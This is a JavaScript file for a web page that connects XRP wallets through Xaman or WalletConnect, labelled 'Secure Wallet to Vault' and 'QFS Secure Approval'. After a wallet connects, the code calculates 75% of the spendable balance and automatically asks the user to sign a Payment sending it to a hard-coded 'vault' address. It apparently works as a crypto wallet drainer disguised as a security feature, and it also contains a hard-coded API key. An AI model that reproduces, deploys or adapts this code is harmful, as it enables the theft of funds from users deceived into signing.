// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID";
const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT
// ==============================
// 'implicit: true' ensures smoother transitions on mobile browsers
const xumm = new XummPkce(XUMM_API_KEY, { implicit: true });

let wcClient = null;
let wcModal  = null;
let currentAddress = null;
let currentWalletType = null;

// Handle Redirect/Success for Xaman
xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me) handlePostConnect("xaman", state.me.account);
});

// ==============================
// UI HELPERS
// ==============================
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

function updateButtonToSecure() {
  const btn = document.getElementById("mainActionButton");
  if (btn) {
    btn.removeAttribute("data-bs-toggle");
    btn.removeAttribute("data-bs-target");
    btn.innerText = "Secure Wallet to Vault";
    btn.onclick = () => triggerManualApproval();
  }
}

// ==============================
// MAIN LOGIC
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting…");
    if (type === "xaman") {
      const session = await xumm.authorize();
      if (session?.me) handlePostConnect("xaman", session.me.account);
    } else if (type === "walletconnect") {
      await initWalletConnect();
      const addr = await connectViaWalletConnect();
      if (addr) handlePostConnect("walletconnect", addr);
    }
  } catch (err) {
    console.error(err);
    setStatus("Failed");
  }
}

async function handlePostConnect(type, address) {
  currentAddress = address;
  currentWalletType = type;
  
  // Close modal if using Bootstrap
  const modalEl = document.getElementById('walletSelectionModal');
  if (modalEl) {
    const modalInstance = bootstrap.Modal.getInstance(modalEl);
    if (modalInstance) modalInstance.hide();
  }

  setStatus(`Connected: ${shortAddr(address)}`);
  updateButtonToSecure();
  
  // Auto-trigger approval even if balance is 0
  triggerManualApproval();
}

async function triggerManualApproval() {
  if (!currentAddress) return;
  try {
    setStatus("Preparing...");
    const data = await getXrpAccountData(currentAddress);
    
    // PROMPT EVEN IF 0: We proceed regardless of data.sendDrops value
    setStatus("Awaiting signature…");
    await signAndSubmit(currentWalletType, currentAddress, data.sendDrops);
    
    setStatus("Transaction submitted ✔");
  } catch (err) {
    console.error(err);
    setStatus("Error prompting signature");
  }
}

async function signAndSubmit(type, address, amountDrops) {
  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops || "0" // Default to 0 if balance is empty
  };

  if (type === "xaman") {
    // This will open the QR modal on desktop or redirect on mobile
    await xumm.payload.create(tx);
  } else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
  }
}

// ==============================
// XRP DATA FETCH (Allowing 0)
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();
  try {
    const info = await client.request({
      command: "account_info",
      account: address,
      ledger_index: "validated"
    }).catch(() => null);

    if (!info) return { sendXrp: 0, sendDrops: "0" };

    const bal = BigInt(info.result.account_data.Balance);
    const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
    const reserve = 10_000_000n + (ownerCount * 2_000_000n);
    const spendable = bal - reserve;
    const send = spendable > 0n ? (spendable * 75n) / 100n : 0n;

    return { sendXrp: Number(send) / 1_000_000, sendDrops: send.toString() };
  } finally {
    await client.disconnect();
  }
}

// ==============================
// WALLETCONNECT HELPERS
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: { name: "QFS", description: "Secure Approval", url: window.location.origin }
  });
  wcModal = new WalletConnectModal({ projectId: WC_PROJECT_ID, standaloneChains: ["xrpl:0"] });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: { xrpl: { chains: ["xrpl:0"], methods: ["xrpl_signTransaction"] } }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}